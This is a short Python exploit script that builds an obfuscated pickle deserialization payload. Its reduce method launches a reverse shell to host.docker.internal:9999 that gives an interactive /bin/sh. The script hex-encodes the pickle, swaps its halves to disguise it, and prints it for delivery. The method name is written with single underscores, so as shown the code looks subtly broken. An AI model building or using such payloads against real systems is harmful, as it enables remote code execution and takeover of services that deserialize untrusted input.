import pickle
import base64
import os
import requests

class PickleRce(object):
    def _reduce_(self):
        import subprocess
        return (subprocess.Popen, (('/bin/sh','-c','python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"host.docker.internal\",9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);\''),0))

obfuscate1 = pickle.dumps(PickleRce())
obfuscate2 = obfuscate1.hex()
obfuscate3 = obfuscate2[len(obfuscate2)//2:] + obfuscate2[:len(obfuscate2)//2]

print(f"Payload: {obfuscate3}")